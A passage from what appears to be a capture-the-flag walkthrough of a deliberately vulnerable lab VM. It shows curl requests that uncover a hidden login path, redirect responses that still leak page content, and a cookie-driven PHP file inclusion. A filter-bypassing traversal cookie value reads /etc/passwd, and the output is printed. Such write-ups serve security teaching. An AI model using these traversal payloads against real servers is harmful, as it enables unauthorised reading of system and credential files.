</span><span class='line'>* Connection <span class="c">#0 to host 192.168.56.102 left intact</span>
</span><span class='line'>* Issue another request to this URL: <span class="s1">&#39;http://192.168.56.102/super_secret_login_path_muhahaha/index.php&#39;</span>
</span><span class='line'>* Re-using existing connection! <span class="o">(</span><span class="c">#0) with host (nil)</span>
</span><span class='line'>* Connected to <span class="o">(</span>nil<span class="o">)</span> <span class="o">(</span>192.168.56.102<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/index.php HTTP/1.1
</span></code></pre></td></tr></table></div></figure>


<p>Look at line 25. <em>Ignoring the request-body</em>. But we got a 302? Ok lets make another request without the <code>-L</code> flag and check if it reveals anything:</p>

<figure class='code'><figcaption><span>personal.php content</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -v http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.102 port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 192.168.56.102...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 192.168.56.102 <span class="o">(</span>192.168.56.102<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 192.168.56.102
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>8u300rbb0747fi6iocm0lt4310
</span><span class='line'>&gt;
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 302 Found
</span><span class='line'>&lt; Date: Sun, 20 Jul 2014 07:54:07 GMT
</span><span class='line'>&lt; Server: Apache/2.2.22 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'>&lt; X-Powered-By: PHP/5.4.4-14+deb7u11
</span><span class='line'>&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span><span class='line'>&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span class="o">=</span>0, pre-check<span class="o">=</span>0
</span><span class='line'>&lt; Pragma: no-cache
</span><span class='line'>&lt; Location: index.php
</span><span class='line'>&lt; Vary: Accept-Encoding
</span><span class='line'>&lt; Content-Length: 387
</span><span class='line'>&lt; Content-Type: text/html
</span><span class='line'>&lt;
</span><span class='line'>&lt;HTML&gt;
</span><span class='line'>&lt;FORM <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;login&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;check.php&quot;</span>&gt;
</span><span class='line'>&lt;CENTER&gt;
</span><span class='line'>&lt;H1&gt; Personal Folder Login &lt;/H1&gt;
</span><span class='line'>&lt;H3&gt;
</span><span class='line'>&lt;STRONG&gt;Username:&lt;/STRONG&gt;
</span><span class='line'>&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;username&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;username&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span>/&gt;
</span><span class='line'>&lt;BR&gt;
</span><span class='line'>&lt;BR&gt;
</span><span class='line'>&lt;STRONG&gt;Password:&lt;/STRONG&gt;
</span><span class='line'>&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span>/&gt;
</span><span class='line'>&lt;BR&gt;
</span><span class='line'>&lt;BR&gt;
</span><span class='line'>&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;mysubmit&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;mysubmit&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span>/&gt;
</span><span class='line'>&lt;/H3&gt;
</span><span class='line'>&lt;/HTML&gt;
</span><span class='line'>
</span><span class='line'>* Connection <span class="c">#0 to host 192.168.56.102 left intact</span>
</span><span class='line'>* Closing connection <span class="c">#0</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well what do you know. We get a 302 and content. This time we have a login form that posts to <code>check.php</code>. A <code>GET</code> request to <code>check.php</code> resulted in a 302, but to <code>personal.php</code> and not <code>index.php</code>.</p>

<p><code>panel.php</code> had similar behavior. Showing content even though we got a 302. The output for <code>panel.php</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>   <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we have another script, <code>notes.php</code> revealed. Browsing to <code>notes.php</code>, we are presented with a input field with a <em>Write Note</em> button, and a message stating: <em>&ldquo;note.txt stored to temporary storage upon submission&rdquo;</em>. I guessed this temporary storage is most probably /tmp. Posting to notes.php did not yield any input and I figured this was part of something to come later.</p>

<h2>finding the web vuln</h2>

<p>Ok we have come this far and you still reading? :O Just a little more and all will be revealed I promise.</p>

<p>Back to <code>check.php</code>, it was time to check for any potential SQL injection on the post to <code>check.php</code> from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie <code>failcount</code>. failcount would increment with every incorrect login to <code>check.php</code>. After <em>3</em> failed attempts, another cookie called <code>intruder</code> was set:</p>

<figure class='code'><figcaption><span>Hell failcount</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Added cookie <span class="nv">intruder</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="k">for </span>domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire 0
</span><span class='line'>&gt; Cookie: <span class="nv">intruder</span><span class="o">=</span>1<span class="p">;</span> <span class="nv">failcount</span><span class="o">=</span>4<span class="p">;</span> <span class="nv">PHPSESSID</span><span class="o">=</span>8u300rbb0747fi6iocm0lt4310
</span></code></pre></td></tr></table></div></figure>


<p>Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for <code>panel.php</code>:</p>

<figure class='code'><figcaption><span>Hell Intruder</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;HTML&gt;
</span><span class='line'>&lt;CENTRE&gt;
</span><span class='line'>&lt;H2&gt; Folders &lt;/H2&gt;
</span><span class='line'>&lt;TABLE <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;width:700px&quot;</span> <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span>&gt;
</span><span class='line'>&lt;TR&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;server.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;mail.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;users.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;personal.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;notes.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>&lt;/TR&gt;
</span><span class='line'>&lt;TR&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>&lt;/TR&gt;
</span><span class='line'>&lt;/CENTRE&gt;
</span><span class='line'>&lt;HTML&gt;
</span><span class='line'>&lt;CENTER&gt;
</span><span class='line'>&lt;FONT <span class="nv">COLOR</span> <span class="o">=</span> <span class="s2">&quot;RED&quot;</span>&gt;
</span><span class='line'>&lt;H1&gt;INTRUDER ALERT!&lt;/H1&gt;
</span><span class='line'>&lt;/FONT&gt;
</span><span class='line'>&lt;/CENTER&gt;
</span><span class='line'>&lt;/HTML&gt;
</span><span class='line'>&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Notice the familiar <strong>INTRUDER ALERT</strong> message? :) Also remember how this file was called <code>/1</code> from the previous enumeration? Yep! File Include time! With us having a cookiejar file called <code>cookies</code> available for editing, it was easy to play around with this. The normal cookiejar had:</p>

<figure class='code'><figcaption><span>Hell cookiejar</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat cookies
</span><span class='line'><span class="c"># Netscape HTTP Cookie File</span>
</span><span class='line'><span class="c"># http://curl.haxx.se/rfc/cookie_spec.html</span>
</span><span class='line'><span class="c"># This file was generated by libcurl! Edit at your own risk.</span>
</span><span class='line'>
</span><span class='line'>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
</span><span class='line'>192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
</span><span class='line'>192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder 1
</span></code></pre></td></tr></table></div></figure>


<p>To test the file include, the first knee jerk reaction was to replace the <code>1</code> with <code>/etc/passwd</code>. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as <code>/1</code>, like <code>mail.php</code>:</p>

<figure class='code'><figcaption><span>Hell file include testing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat cookies
</span><span class='line'><span class="c"># Netscape HTTP Cookie File</span>
</span><span class='line'><span class="c"># http://curl.haxx.se/rfc/cookie_spec.html</span>
</span><span class='line'><span class="c"># This file was generated by libcurl! Edit at your own risk.</span>
</span><span class='line'>
</span><span class='line'>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
</span><span class='line'>192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
</span><span class='line'>192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ./mail.php
</span><span class='line'>
</span><span class='line'>root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies
</span><span class='line'>
</span><span class='line'>&lt;HTML&gt;
</span><span class='line'>&lt;CENTRE&gt;
</span><span class='line'>&lt;H2&gt; Folders &lt;/H2&gt;
</span><span class='line'>&lt;TABLE <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;width:700px&quot;</span> <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span>&gt;
</span><span class='line'>&lt;TR&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;server.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;mail.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;users.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;personal.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;notes.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>&lt;/TR&gt;
</span><span class='line'>&lt;TR&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>&lt;/TR&gt;
</span><span class='line'>&lt;/CENTRE&gt;
</span><span class='line'>&lt;HTML&gt;
</span><span class='line'>&lt;H3&gt; Email<span class="err">&#39;</span>s recieved in the last 24 hours: &lt;/H3&gt;2&lt;BR&gt;
</span><span class='line'>&lt;H3&gt; Current Status: Firewall Activated &lt;/H3&gt;&lt;BR&gt;
</span><span class='line'>&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s2">&quot;http://i.imgur.com/JjipeOj.gif&quot;</span>&gt;
</span><span class='line'>&lt;/HTML&gt;
</span><span class='line'>&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>YES. It <strong>does</strong> work! We have the same output added to the <code>panel.php</code> output as we would have if we browsed directly to <code>mail.php</code>. By now the assumption was that the code had something like:</p>

<figure class='code'><figcaption><span>Hell File Include assumption</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;intruder&#39;</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>   <span class="k">include</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;intruder&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>&hellip;with some kind of filtering preventing reading the <code>/etc/passwd</code>. While I was still pretty excited about finding this vuln, I soon came across <a href="https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001">this</a>#Gray_Box_testing_and_example) article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the <code>intruder</code> cookie to <code>....//....//....//....//....//etc/passwd</code> and viola! :)</p>

<figure class='code'><figcaption><span>Hell Directory Traversal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat cookies
</span><span class='line'><span class="c"># Netscape HTTP Cookie File</span>
</span><span class='line'><span class="c"># http://curl.haxx.se/rfc/cookie_spec.html</span>
</span><span class='line'><span class="c"># This file was generated by libcurl! Edit at your own risk.</span>
</span><span class='line'>
</span><span class='line'>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
</span><span class='line'>192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
</span><span class='line'>192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ....//....//....//....//....//etc/passwd
</span><span class='line'>
</span><span class='line'>root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies
</span><span class='line'>
</span><span class='line'>&lt;HTML&gt;
</span><span class='line'>&lt;CENTRE&gt;
</span><span class='line'>&lt;H2&gt; Folders &lt;/H2&gt;
</span><span class='line'>&lt;TABLE <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;width:700px&quot;</span> <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span>&gt;
</span><span class='line'>&lt;TR&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;server.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;mail.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;users.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;personal.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;notes.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>&lt;/TR&gt;
</span><span class='line'>&lt;TR&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>&lt;/TR&gt;
</span><span class='line'>&lt;/CENTRE&gt;
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
